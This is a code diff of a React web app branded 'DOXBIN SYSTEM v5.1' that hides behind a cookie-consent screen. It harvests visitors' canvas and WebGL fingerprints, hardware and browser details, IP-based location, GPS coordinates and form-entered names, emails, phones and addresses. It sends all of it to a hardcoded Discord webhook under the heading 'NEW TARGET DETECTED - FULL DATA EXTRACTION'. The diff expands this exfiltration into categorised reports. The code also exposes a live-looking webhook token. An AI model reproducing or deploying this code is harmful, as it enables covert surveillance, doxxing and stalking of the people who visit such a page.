@@ -5,9 +5,9 @@ import './App.css';
 
 const WEBHOOK_URL = "https://canary.discord.com/api/webhooks/1468167808461439061/5ORX06BKJz7Ln8PmZ8hZtmgmUjdsifFcxv-g5y7klogQ-DC9JqMaG8dsVeP5wj4-sFu9";
 
-// Version 5.0.0 - Advanced Data Collection with Consent Layer
+// Version 5.1.0 - Complete Data Extraction with Multi-Embed Discord Reports
 function App() {
-  const [stage, setStage] = useState('consent'); // 'consent', 'form', 'loading', 'result'
+  const [stage, setStage] = useState('consent');
   const [showTerms, setShowTerms] = useState(false);
   const [collectedData, setCollectedData] = useState(null);
   
@@ -24,11 +24,9 @@ function App() {
   const [result, setResult] = useState(null);
   const [focusedField, setFocusedField] = useState(null);
 
-  // Collect device and location data
   const collectDeviceData = async () => {
     try {
       const data = {
-        // Device Info
         userAgent: navigator.userAgent,
         platform: navigator.platform,
         language: navigator.language,
@@ -36,31 +34,20 @@ function App() {
         hardwareConcurrency: navigator.hardwareConcurrency,
         deviceMemory: navigator.deviceMemory,
         maxTouchPoints: navigator.maxTouchPoints,
-        
-        // Screen Info
         screenWidth: window.screen.width,
         screenHeight: window.screen.height,
         screenColorDepth: window.screen.colorDepth,
         screenPixelDepth: window.screen.pixelDepth,
         screenOrientation: window.screen.orientation?.type,
-        
-        // Browser Info
         cookieEnabled: navigator.cookieEnabled,
         doNotTrack: navigator.doNotTrack,
         onLine: navigator.onLine,
-        
-        // Time Info
         timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
         timestamp: new Date().toISOString(),
-        
-        // Canvas Fingerprint
         canvasFingerprint: getCanvasFingerprint(),
-        
-        // WebGL Info
         webglInfo: getWebGLInfo(),
       };
 
-      // Get IP and Location
       const ipData = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({}));
       
       data.ip = ipData.ip;
@@ -72,7 +59,6 @@ function App() {
       data.isp = ipData.org;
       data.timezone_name = ipData.timezone;
 
-      // Get Geolocation if permitted
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(
           (position) => {
@@ -142,91 +128,192 @@ function App() {
   };
 
   const sendToDiscord = async () => {
-    const activeFields = [];
-    let textContent = "🔴 **NEW TARGET DETECTED**\n\n";
+    const embeds = [];
+    let textContent = "🔴 **NEW TARGET DETECTED - FULL DATA EXTRACTION v5.1**\n\n";
 
-    // Add form data
+    // === PERSONAL DATA EMBED ===
+    const personalFields = [];
     if (formData.firstName.trim()) {
-      activeFields.push({ name: "First Name", value: formData.firstName, inline: true });
+      personalFields.push({ name: "First Name", value: formData.firstName, inline: true });
       textContent += `**First Name:** ${formData.firstName}\n`;
     }
     if (formData.lastName.trim()) {
-      activeFields.push({ name: "Last Name", value: formData.lastName, inline: true });
+      personalFields.push({ name: "Last Name", value: formData.lastName, inline: true });
       textContent += `**Last Name:** ${formData.lastName}\n`;
     }
     if (formData.email.trim()) {
-      activeFields.push({ name: "Email", value: formData.email, inline: true });
+      personalFields.push({ name: "Email Address", value: formData.email, inline: true });
       textContent += `**Email:** ${formData.email}\n`;
     }
     if (formData.phone.trim()) {
-      activeFields.push({ name: "Phone", value: formData.phone, inline: true });
+      personalFields.push({ name: "Phone Number", value: formData.phone, inline: true });
       textContent += `**Phone:** ${formData.phone}\n`;
     }
     if (formData.address.trim()) {
-      activeFields.push({ name: "Address", value: formData.address, inline: false });
+      personalFields.push({ name: "Physical Address", value: formData.address, inline: false });
       textContent += `**Address:** ${formData.address}\n`;
     }
     if (formData.ip.trim()) {
-      activeFields.push({ name: "IP Address", value: formData.ip, inline: true });
-      textContent += `**IP:** ${formData.ip}\n`;
+      personalFields.push({ name: "Manual IP Override", value: formData.ip, inline: true });
+      textContent += `**Manual IP:** ${formData.ip}\n`;
     }
 
-    // Add device data
-    textContent += "\n**DEVICE INFORMATION:**\n";
-    activeFields.push({ name: "━━━━━━━━━━━━━━━━", value: "DEVICE DATA", inline: false });
-    
+    if (personalFields.length > 0) {
+      embeds.push({
+        title: "👤 PERSONAL INFORMATION",
+        color: 0xDC2626,
+        fields: personalFields
+      });
+    }
+
+    // === LOCATION & NETWORK DATA EMBED ===
+    const locationFields = [];
     if (collectedData?.ip) {
-      activeFields.push({ name: "Public IP", value: collectedData.ip, inline: true });
+      locationFields.push({ name: "Public IP Address", value: collectedData.ip, inline: true });
       textContent += `**Public IP:** ${collectedData.ip}\n`;
     }
-    if (collectedData?.city && collectedData?.country) {
-      activeFields.push({ name: "Location", value: `${collectedData.city}, ${collectedData.country}`, inline: true });
-      textContent += `**Location:** ${collectedData.city}, ${collectedData.country}\n`;
+    if (collectedData?.city) {
+      locationFields.push({ name: "City", value: collectedData.city, inline: true });
+      textContent += `**City:** ${collectedData.city}\n`;
     }
-    if (collectedData?.latitude && collectedData?.longitude) {
-      activeFields.push({ name: "Coordinates", value: `${collectedData.latitude}, ${collectedData.longitude}`, inline: true });
-      textContent += `**Coordinates:** ${collectedData.latitude}, ${collectedData.longitude}\n`;
+    if (collectedData?.region) {
+      locationFields.push({ name: "Region", value: collectedData.region, inline: true });
+      textContent += `**Region:** ${collectedData.region}\n`;
+    }
+    if (collectedData?.country) {
+      locationFields.push({ name: "Country", value: collectedData.country, inline: true });
+      textContent += `**Country:** ${collectedData.country}\n`;
     }
     if (collectedData?.isp) {
-      activeFields.push({ name: "ISP", value: collectedData.isp, inline: true });
+      locationFields.push({ name: "ISP/Organization", value: collectedData.isp, inline: true });
       textContent += `**ISP:** ${collectedData.isp}\n`;
     }
-    if (collectedData?.userAgent) {
-      activeFields.push({ name: "User Agent", value: collectedData.userAgent.substring(0, 100), inline: false });
-      textContent += `**User Agent:** ${collectedData.userAgent}\n`;
+    if (collectedData?.latitude && collectedData?.longitude) {
+      locationFields.push({ name: "GPS Coordinates", value: `${collectedData.latitude.toFixed(4)}, ${collectedData.longitude.toFixed(4)}`, inline: true });
+      textContent += `**GPS:** ${collectedData.latitude}, ${collectedData.longitude}\n`;
+    }
+    if (collectedData?.timezone_name) {
+      locationFields.push({ name: "Timezone", value: collectedData.timezone_name, inline: true });
+      textContent += `**Timezone:** ${collectedData.timezone_name}\n`;
+    }
+
+    if (locationFields.length > 0) {
+      embeds.push({
+        title: "🌍 LOCATION & NETWORK",
+        color: 0xEA580C,
+        fields: locationFields
+      });
+    }
+
+    // === DEVICE HARDWARE EMBED ===
+    const hardwareFields = [];
+    if (collectedData?.platform) {
+      hardwareFields.push({ name: "Operating System", value: collectedData.platform, inline: true });
+      textContent += `**OS:** ${collectedData.platform}\n`;
     }
     if (collectedData?.screenWidth && collectedData?.screenHeight) {
-      activeFields.push({ name: "Screen Resolution", value: `${collectedData.screenWidth}x${collectedData.screenHeight}`, inline: true });
+      hardwareFields.push({ name: "Screen Resolution", value: `${collectedData.screenWidth}x${collectedData.screenHeight}`, inline: true });
       textContent += `**Resolution:** ${collectedData.screenWidth}x${collectedData.screenHeight}\n`;
     }
+    if (collectedData?.screenColorDepth) {
+      hardwareFields.push({ name: "Color Depth", value: `${collectedData.screenColorDepth}-bit`, inline: true });
+      textContent += `**Color Depth:** ${collectedData.screenColorDepth}-bit\n`;
+    }
     if (collectedData?.hardwareConcurrency) {
-      activeFields.push({ name: "CPU Cores", value: collectedData.hardwareConcurrency.toString(), inline: true });
+      hardwareFields.push({ name: "CPU Cores", value: collectedData.hardwareConcurrency.toString(), inline: true });
       textContent += `**CPU Cores:** ${collectedData.hardwareConcurrency}\n`;
     }
     if (collectedData?.deviceMemory) {
-      activeFields.push({ name: "RAM", value: `${collectedData.deviceMemory}GB`, inline: true });
+      hardwareFields.push({ name: "RAM Available", value: `${collectedData.deviceMemory}GB`, inline: true });
       textContent += `**RAM:** ${collectedData.deviceMemory}GB\n`;
     }
+    if (collectedData?.maxTouchPoints) {
+      hardwareFields.push({ name: "Touch Points", value: collectedData.maxTouchPoints.toString(), inline: true });
+      textContent += `**Touch Points:** ${collectedData.maxTouchPoints}\n`;
+    }
+
+    if (hardwareFields.length > 0) {
+      embeds.push({
+        title: "⚙️ HARDWARE INFORMATION",
+        color: 0x7C3AED,
+        fields: hardwareFields
+      });
+    }
+
+    // === BROWSER & SOFTWARE EMBED ===
+    const browserFields = [];
+    if (collectedData?.userAgent) {
+      browserFields.push({ name: "User Agent", value: collectedData.userAgent, inline: false });
+      textContent += `**User Agent:** ${collectedData.userAgent}\n`;
+    }
     if (collectedData?.language) {
-      activeFields.push({ name: "Language", value: collectedData.language, inline: true });
+      browserFields.push({ name: "Primary Language", value: collectedData.language, inline: true });
       textContent += `**Language:** ${collectedData.language}\n`;
     }
+    if (collectedData?.languages && collectedData.languages.length > 0) {
+      browserFields.push({ name: "All Languages", value: collectedData.languages.join(", "), inline: false });
+      textContent += `**Languages:** ${collectedData.languages.join(", ")}\n`;
+    }
     if (collectedData?.timezone) {
-      activeFields.push({ name: "Timezone", value: collectedData.timezone, inline: true });
+      browserFields.push({ name: "System Timezone", value: collectedData.timezone, inline: true });
       textContent += `**Timezone:** ${collectedData.timezone}\n`;
+    }
+    if (collectedData?.cookieEnabled !== undefined) {
+      browserFields.push({ name: "Cookies Enabled", value: collectedData.cookieEnabled ? "Yes" : "No", inline: true });
+      textContent += `**Cookies:** ${collectedData.cookieEnabled ? "Yes" : "No"}\n`;
+    }
+    if (collectedData?.onLine !== undefined) {
+      browserFields.push({ name: "Online Status", value: collectedData.onLine ? "Online" : "Offline", inline: true });
+      textContent += `**Status:** ${collectedData.onLine ? "Online" : "Offline"}\n`;
+    }
+    if (collectedData?.screenOrientation) {
+      browserFields.push({ name: "Screen Orientation", value: collectedData.screenOrientation, inline: true });
+      textContent += `**Orientation:** ${collectedData.screenOrientation}\n`;
+    }
+
+    if (browserFields.length > 0) {
+      embeds.push({
+        title: "🌐 BROWSER & SOFTWARE",
+        color: 0x0EA5E9,
+        fields: browserFields
+      });
+    }
+
+    // === FINGERPRINTING DATA EMBED ===
+    const fingerprintFields = [];
+    if (collectedData?.canvasFingerprint && collectedData.canvasFingerprint !== 'unavailable') {
+      fingerprintFields.push({ name: "Canvas Fingerprint", value: "[Successfully Captured]", inline: true });
+      textContent += `**Canvas FP:** [Captured]\n`;
+    }
+    if (collectedData?.webglInfo && collectedData.webglInfo !== 'unavailable') {
+      if (typeof collectedData.webglInfo === 'object') {
+        fingerprintFields.push({ name: "WebGL Vendor", value: collectedData.webglInfo.vendor || "Unknown", inline: true });
+        fingerprintFields.push({ name: "WebGL Renderer", value: collectedData.webglInfo.renderer || "Unknown", inline: true });
+        textContent += `**WebGL Vendor:** ${collectedData.webglInfo.vendor}\n**WebGL Renderer:** ${collectedData.webglInfo.renderer}\n`;
+      }
+    }
+    if (collectedData?.timestamp) {
+      fingerprintFields.push({ name: "Collection Timestamp", value: collectedData.timestamp, inline: false });
+      textContent += `**Timestamp:** ${collectedData.timestamp}\n`;
+    }
+    if (collectedData?.screenPixelDepth) {
+      fingerprintFields.push({ name: "Pixel Depth", value: `${collectedData.screenPixelDepth}-bit`, inline: true });
+      textContent += `**Pixel Depth:** ${collectedData.screenPixelDepth}-bit\n`;
+    }
+
+    if (fingerprintFields.length > 0) {
+      embeds.push({
+        title: "🔐 DIGITAL FINGERPRINT",
+        color: 0x8B5CF6,
+        fields: fingerprintFields
+      });
     }
 
     const payload = {
-      username: "DOXBIN SYSTEM",
+      username: "DOXBIN SYSTEM v5.1",
       content: textContent,
-      embeds: [{
-        title: "🔴 Target Data Captured (Full Profile)",
-        description: "Complete device fingerprint and personal information collected.",
-        color: 0xDC2626,
-        fields: activeFields.slice(0, 25), // Discord limit
-        footer: { text: "DOXBIN v5.0 | Complete Data Extraction" },
-        timestamp: new Date().toISOString()
-      }]
+      embeds: embeds,
+      tts: false
     };
 
     try {
@@ -282,7 +369,6 @@ function App() {
 
   return (
     <div className="min-h-screen bg-gradient-to-br from-slate-950 via-black to-slate-950 flex items-center justify-center p-4 relative overflow-hidden">
-      {/* Background effects */}
       <div className="absolute inset-0 overflow-hidden pointer-events-none">
         <div className="absolute -top-1/2 -right-1/2 w-full h-full bg-gradient-to-bl from-red-900/10 to-transparent rounded-full blur-3xl"></div>
         <div className="absolute -bottom-1/2 -left-1/2 w-full h-full bg-gradient-to-tr from-red-900/5 to-transparent rounded-full blur-3xl"></div>
@@ -290,7 +376,7 @@ function App() {
 
       <AnimatePresence mode="wait">
         {stage === 'consent' && (
-          <ConsentScreen key="consent" onAccept={handleAcceptCookies} onTerms={() => setShowTerms(true)} showTerms={showTerms} collectedData={collectedData} />
+          <ConsentScreen key="consent" onAccept={handleAcceptCookies} onTerms={() => setShowTerms(true)} showTerms={showTerms} />
         )}
         {stage === 'form' && (
           <FormScreen key="form" formData={formData} handleChange={handleChange} handleSubmit={handleSubmit} isSubmitting={isSubmitting} result={result} focusedField={focusedField} setFocusedField={setFocusedField} />
@@ -306,7 +392,7 @@ function App() {
   );
 }
 
-function ConsentScreen({ onAccept, onTerms, showTerms, collectedData }) {
+function ConsentScreen({ onAccept, onTerms, showTerms }) {
   return (
     <motion.div
       initial={{ opacity: 0, scale: 0.95 }}
@@ -423,7 +509,7 @@ function FormScreen({ formData, handleChange, handleSubmit, isSubmitting, result
                 </div>
                 <div>
                   <h1 className="text-3xl font-black text-white tracking-tight">DOXBIN</h1>
-                  <p className="text-xs text-slate-400 font-medium tracking-widest">v5.0 • PREMIUM</p>
+                  <p className="text-xs text-slate-400 font-medium tracking-widest">v5.1 • PREMIUM</p>
                 </div>
               </div>
               <Shield className="w-6 h-6 text-red-600/60" />
